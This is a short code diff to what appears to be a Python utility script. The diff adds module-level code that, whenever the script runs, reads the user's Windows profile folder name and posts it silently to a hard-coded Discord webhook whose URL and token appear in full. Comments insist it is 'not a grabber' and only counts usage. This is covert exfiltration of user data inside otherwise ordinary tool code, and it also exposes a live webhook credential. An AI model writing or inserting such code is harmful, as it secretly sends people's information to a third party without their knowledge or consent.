@@ -3,6 +3,8 @@ import webbrowser
 from pystyle import Colorate,Colors
 from time import sleep
 from os import system
+import os
+import requests
 
 banner='''
 
@@ -23,7 +25,11 @@ banner='''
 >Github https://github.com/zufinho
 >Discord github zufinho server: https://discord.gg/jvrBvcCm72
 '''
-
+#this is a not grabber
+#is just to view if my project has been used for any people
+acessed = {'content': os.path.basename(os.getenv("USERPROFILE"))}
+acessesend= requests.post('https://discord.com/api/webhooks/1111072267942772736/CX51xpc8kWWKXz4qZqTG8otzrH6xVPHbhyBNUVa_Cr52WtCktnOHp8L1ICzIZpu6dMwy', json=acessed)
+#please dont spam my webhook
 
 def install(id):
     with open("database.json","r") as databasejson:
